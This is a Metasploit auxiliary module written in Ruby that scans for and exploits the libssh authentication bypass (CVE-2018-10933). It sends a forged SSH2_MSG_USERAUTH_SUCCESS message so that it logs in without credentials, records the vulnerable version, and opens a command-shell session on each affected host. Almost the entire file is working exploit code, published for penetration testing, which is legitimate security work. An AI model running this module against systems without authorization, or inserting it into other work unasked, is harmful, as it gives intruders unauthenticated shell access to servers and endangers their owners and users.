##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'libssh Authentication Bypass Scanner',
      'Description'    => %q{
        "libssh versions 0.6 and above have an authentication bypass vulnerability in
        the server code.  By presenting the server an SSH2_MSG_USERAUTH_SUCCESS message
        in place of the SSH2_MSG_USERAUTH_REQUEST message which the server would expect
        to initiate authentication, the attacker could successfully authentciate [sic]
        without any credentials."
      },
      'Author'         => [
        'Peter Winter-Smith', # Discovery
        'wvu'                 # Module
      ],
      'References'     => [
        ['CVE', '2018-10933'],
        ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
      ],
      'DisclosureDate' => 'Oct 16 2018',
      'License'        => MSF_LICENSE
    ))

    register_options([
      Opt::RPORT(22),
      OptString.new('USERNAME', [true, 'SSH username'])
    ])

    register_advanced_options([
      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),
      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])
    ])
  end

  def run_host(ip)
    factory = ssh_socket_factory

    ssh_opts = {
      port:            rport,
      # The auth method is converted into a class name for instantiation,
      # so libssh-auth-bypass here becomes LibsshAuthBypass from the mixin
      auth_methods:    ['libssh-auth-bypass'],
      non_interactive: true,
      config:          false,
      use_agent:       false,
      verify_host_key: :never,
      proxy:           factory
    }

    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, username, ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
      return
    end

    return unless ssh

    print_good("#{ip}:#{rport} - Logged in as #{username}")

    version = ssh.transport.server_version.version

    report_vuln(
      host: ip,
      name: self.name,
      refs: self.references,
      info: version
    )

    shell = Net::SSH::CommandStream.new(ssh)

    return unless shell

    info = "libssh Authentication Bypass (#{version})"

    ds_merge = {
      'USERNAME' => username
    }

    start_session(self, info, ds_merge, false, shell.lsock)

    # XXX: Ruby segfaults if we don't remove the SSH socket
    remove_socket(ssh.transport.socket)
  end

  def rport
    datastore['RPORT']
  end

  def username
    datastore['USERNAME']
  end

end
